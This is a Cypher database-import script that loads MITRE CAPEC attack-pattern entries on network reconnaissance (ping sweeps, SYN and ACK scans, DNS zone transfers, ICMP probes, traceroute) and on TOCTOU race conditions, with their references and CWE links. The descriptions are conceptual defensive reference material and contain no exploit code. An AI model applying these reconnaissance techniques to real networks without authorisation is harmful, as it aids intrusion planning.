CREATE (:Description{id: 258, summary: "OrderedDict([('Text', \"An attacker sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss. Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognize the key security goal of the attacker is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An attacker can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc. The attackers goal is to discover as many potential targets as possible can utilize a wide range of techniques to achieve this end. ICMP pings have the following characteristics:\"), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Host Discovery: Can be used to discover if a host is alive via ICMP Echo Reply Message', '2. Effective Against: LANs or Internal IP address ranges where firewall or ACL rules are less restrictive', '3. Weak Against: Firewalls properly configured to block ICMP Echo Request and Echo Replies.', '4. Port State: Unable to determine the status of ports on a host.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.285.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 44-51", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.285.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.285.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-28", local_id: "R.285.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
MERGE (:Reference{id: "REF-22", local_id: "R.285.5", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.5.2 Ping Scan (-SP), pg. 58", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 153, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.</p>\n</div>"});
CREATE (:AttackPattern{id: 287, name: "TCP SYN Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 236, text: "<div level=\"0\">\n  <p class=\"text\">This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets.</p>\n</div>"});
CREATE (:Submission{id: 265});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 259, summary: "OrderedDict([('Text', [\"An attacker uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its enormous advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method the primary advantages of SYN scanning are its universality and speed. RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service. For this reason, like TCP Connect scanning, SYN scanning works against any TCP stack. Unlike TCP Connect scanning, it is possible to scan thousands of ports per second using this method. This type of scanning is usually referred to as 'half-open' scanning because it does not complete the three-way handshake. The scanning rate is extremely fast because no time is wasted completing the handshake or tearing down the connection. TCP SYN scanning can also immediately detect 3 of the 4 important types of port status: open, closed, and filtered. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. This technique allows an attacker to scan through stateful firewalls due to the common configuration that TCP SYN segments for a new connection will be allowed for almost any port. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered. A TCP Connect scan has the following characteristics:\", 'SYN scanning is fast and provides the attacker with a wealth of information. The primary drawback is that SYN scanning requires the ability to access \"raw sockets\" in order to create the packets. As a result, it is not possible to perform a SYN scan from some systems (Windows XP SP 2). On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP SYN scanning is fast compared to other types of scans.', '2. Stealth: TCP SYN scanning is stealthy and SYN scan detection is fraught with false positives.', '3. Open Port: Detects that a port is open via a successful SYN/ACK to the SYN.', '4. Closed Port: Detects that a port is closed via a successful RST to the SYN', '5. Filtered Port: No response, or ICMP messages, indicates the presence of a filter.', '6. Unfiltered Port: Cannot distinguish between a state-fully filtered port and an unfiltered port.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.287.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.287.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.287.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.32 TCP SYN (Stealth) Scan, pg. 100", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.287.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 154, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send TCP SYN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 288, name: "DEPRECATED: ICMP Echo Request Ping", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 266});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 260, summary: "OrderedDict([('Text', \"An attacker sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss. Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognize the key security goal of the attacker is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An attacker can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc. The attackers goal is to discover as many potential targets as possible can utilize a wide range of techniques to achieve this end. ICMP pings have the following characteristics:\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.288.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 44-51", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.288.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.288.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-28", local_id: "R.288.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
MERGE (:Reference{id: "REF-22", local_id: "R.288.5", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.5.2 Ping Scan (-SP), pg. 58", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
CREATE (:AttackPattern{id: 289, name: "DEPRECATED: Infrastructure-based footprinting", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 267});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 213});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 261, summary: "OrderedDict([('Text', '\"Infrastructure-based footprinting involves interacting with available network or application resources for the purpose of gathering information about the architecture, topology, configuration, or potential vulnerabilities and exposures of a target networking infrastructure.\"')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.289.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 38-39", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 29, name: "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 238, text: "<div level=\"0\">\n  <p class=\"text\">A resource is access/modified concurrently by multiple processes.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 239, text: "<div level=\"0\">\n  <p class=\"text\">The attacker is able to modify resource.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 240, text: "<div level=\"0\">\n  <p class=\"text\">A race condition exists while accessing a resource.</p>\n</div>"});
CREATE (:Submission{id: 268});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 214});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 262, summary: "OrderedDict([('Text', 'This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. The typical example is the file access. The attacker can leverage a file access race condition by \"running the race\", meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the attacker could do something such as replace the file and cause an escalation of privilege.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker explores to gauge what level of access he has.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker confirms access to a resource on the target host. The attacker confirms ability to modify the targeted resource.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker decides to leverage the race condition by \"running the race\", meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the attacker can replace the resource and cause an escalation of privilege.</p>\n</div>"});
MERGE (:Reference{id: "REF-29", local_id: "R.29.1", author: "['J. Viega', 'G. McGraw']", title: "Building Secure Software", publisher: "Addison-Wesley", pubdate: "2002"});
MERGE (:Reference{id: "REF-3", local_id: "R.29.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-41", local_id: "R.29.3", author: "Fortify Software", title: "SAMATE - Software Assurance Metrics And Tool Evaluation", section: "Test Case ID 1598", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2006-06-22", link: "http://samate.nist.gov/SRD/view_testcase.php?tID=1598"});
MERGE (:CWE{id: 367});
MERGE (:CWE{id: 368});
MERGE (:CWE{id: 366});
MERGE (:CWE{id: 370});
MERGE (:CWE{id: 362});
MERGE (:CWE{id: 662});
MERGE (:CWE{id: 691});
MERGE (:CWE{id: 663});
MERGE (:CWE{id: 665});
CREATE (:AttackPattern{id: 290, name: "Enumerate Mail Exchange (MX) Records", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 241, text: "<div level=\"0\">\n  <p class=\"text\">Access to a DNS server that will return the MX records for a network.</p>\n</div>"});
CREATE (:Submission{id: 269});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 263, summary: "OrderedDict([('Text', 'An attacker enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a Firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.290.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 38", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:ResourcesRequired{id: 157, text: "<div level=\"0\">\n  <p class=\"text\">A command-line utility or other application capable of sending requests to the DNS server is necessary.</p>\n</div>"});
CREATE (:AttackPattern{id: 291, name: "DNS Zone Transfers", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 242, text: "<div level=\"0\">\n  <p class=\"text\">Access to a DNS server that allows Zone transfers.</p>\n</div>"});
CREATE (:Submission{id: 270});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 264, summary: "OrderedDict([('Text', \"An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.291.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 34", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:ResourcesRequired{id: 158, text: "<div level=\"0\">\n  <p class=\"text\">A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.</p>\n</div>"});
CREATE (:AttackPattern{id: 292, name: "Host Discovery", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 243, text: "<div level=\"0\">\n  <p class=\"text\">A network capable of routing the attackers' packets to the destination network.</p>\n</div>"});
CREATE (:Submission{id: 271});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 215});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 265, summary: "OrderedDict([('Text', \"An attacker sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. An attacker usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal of the attacker is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the attacker can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep' where a particular kind of ping is sent to a range of IP addresses.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.292.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 1: Footprinting, pp.44", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-22", local_id: "R.292.2", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.6 Host Discover Techniques, pg.57", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{local_id: "R.292.2", author: "ATT&CK Project", title: "Local network connection enumeration (1049)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Local_network_connection_enumeration"});
CREATE (:ResourcesRequired{id: 159, text: "<div level=\"0\">\n  <p class=\"text\">The resources required will differ based upon the type of host discovery being performed. Usually a scanner or scanning script is required due to the volume of requests that must be generated.</p>\n</div>"});
CREATE (:AttackPattern{id: 293, name: "Traceroute Route Enumeration", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 244, text: "<div level=\"0\">\n  <p class=\"text\">A network capable of routing the attackers' packets to the destination network.</p>\n</div>"});
CREATE (:Submission{id: 272});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 266, summary: "OrderedDict([('Text', 'An attacker uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow an attacker to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP. As more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.293.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 38-41", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:ResourcesRequired{id: 160, text: "<div level=\"0\">\n  <p class=\"text\">A command line version of traceroute or similar tool that performs route enumeration.</p>\n</div>"});
CREATE (:AttackPattern{id: 294, name: "ICMP Address Mask Request", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 245, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally, modern operating systems will ignore ICMP type 17 messages, however, routers will commonly respond to this request.</p>\n</div>"});
CREATE (:Submission{id: 273});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 267, summary: "OrderedDict([('Text', 'An attacker sends an ICMP Type 17 Address Mask Request to gather information about a target\\'s networking configuration. ICMP Address Mask Requests are defined by RFC-950, \"Internet Standard Subnetting Procedure.\" An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps an attacker plan router-based attacks as well as denial-of-service attacks against the broadcast address. Many modern operating systems will not respond to ICMP type 17 messages for security reasons. Determining whether a system or router will respond to an ICMP Address Mask Request helps the attacker determine operating system or firmware version. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 17 and egress ICMP type 18 messages.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.294.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 53-54", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{local_id: "R.294.2", author: "['J. Mogul', 'J. Postel']", title: "RFC950 - Internet Standard Subnetting Procedure", pubdate: "August 1985", link: "http://www.faqs.org/rfcs/rfc950.html"});
MERGE (:Reference{id: "REF-23", local_id: "R.294.3", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-28", local_id: "R.294.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
MERGE (:Reference{id: "REF-22", local_id: "R.294.5", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.7.2 ICMP Probe Selection, pg. 70", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 161, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities. The following tools allow a user to craft custom ICMP messages when performing reconnaissance:</p>\n</div>"});
CREATE (:AttackPattern{id: 295, name: "ICMP Timestamp Request", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 246, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send an ICMP type 13 query (Timestamp Request) to a remote target and receive an ICMP type 14 message (Timestamp Reply) in response.</p>\n</div>"});
CREATE (:Submission{id: 274});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 268, summary: "OrderedDict([('Text', \"An attacker sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An attacker can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. An attacker may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.295.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 44-51", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.295.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.295.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-28", local_id: "R.295.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
MERGE (:Reference{id: "REF-22", local_id: "R.295.5", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.7.2 ICMP Probe Selection, pg. 70", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 162, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.</p>\n</div>"});
CREATE (:AttackPattern{id: 296, name: "ICMP Information Request", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 247, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response.</p>\n</div>"});
CREATE (:Submission{id: 275});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 269, summary: "OrderedDict([('Text', 'An attacker sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type that no has any use. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.296.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 44-51", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.296.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.296.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-28", local_id: "R.296.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
MERGE (:Reference{id: "REF-22", local_id: "R.296.5", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.7.2 ICMP Probe Selection, pg. 70", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 163, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.</p>\n</div>"});
CREATE (:AttackPattern{id: 297, name: "TCP ACK Ping", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 248, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result, it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.</p>\n</div>"});
CREATE (:Submission{id: 276});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 270, summary: "OrderedDict([('Text', [\"An attacker sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, an attacker identify that the host is alive by looking for a RST packet. Typically a remote server will respond with a RST regardless of whether a port is open or closed. In either case, the attacker can determine that the host is alive. TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. TCP ACK pings are most likely to fail in cases where a stateful firewall is present. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping has the following characteristics:\", 'The tool nmap will send TCP ACK pings when the command line \"-PA\" switch is used. Sending an ACK ping requires the ability to access \"raw sockets\" in order to create the packets with direct access to the packet header.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Host Discovery: Can be used to discover if a host is alive via RST response packets sent from the host.', '2. Effective Against: Stateless Firewalls due to a typical lack of rules that reject unsolicited ACK packets.', '3. Weak Against: Stateful Firewalls due to the ability to reject a packet not part of an existing connection.', '4. Port State: Unable to determine if a port is open or closed.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.297.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 49", publisher: "McGraw Hill", pubdate: "2009"});
